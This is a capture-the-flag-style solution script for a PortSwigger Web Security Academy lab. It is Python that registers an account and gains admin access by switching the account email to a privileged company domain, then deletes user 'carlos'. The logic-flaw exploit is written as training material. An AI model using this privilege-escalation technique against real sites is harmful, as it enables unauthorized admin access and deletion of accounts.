# Lab: Inconsistent security controls

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get register

response = requests.get('https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/register')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post register

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'b',
    'email': 'attackerr@exploit-0a7500c503552e18c23e7e81016f0068.exploit-server.net',
    'password': 'b',
}

response = requests.post(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/register',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

# Get link from email

response = requests.get(
    'https://exploit-0a7500c503552e18c23e7e81016f0068.exploit-server.net/email',
    verify=False,
)
soup = BeautifulSoup(response.text, 'html.parser')
link = soup.find_all('a')[3]['href']

# Get link to confirm register

response = requests.get(
    link,
    cookies=cookies,
    verify=False,
)

# Get login

response = requests.get(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/login',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


# Post login

data = {
    'csrf': csrf,
    'username': 'b',
    'password': 'b',
}

response = requests.post(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/login',
    data=data,
    cookies=cookies,
    allow_redirects=False,
    verify=False,
    )

session = response.headers['set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

# Get my account page

response = requests.get(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/my-account',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post change email

data = {
    'email': 'cattackerr@dontwannacry.com',
    'csrf': csrf,
}

response = requests.post(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/my-account/change-email',
    cookies=cookies,
    data=data,
    verify=False,
)

# Delete user carlos
response = requests.get(
    'https://0a1300dd03882e72c2817fb60032005c.web-security-academy.net/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)
```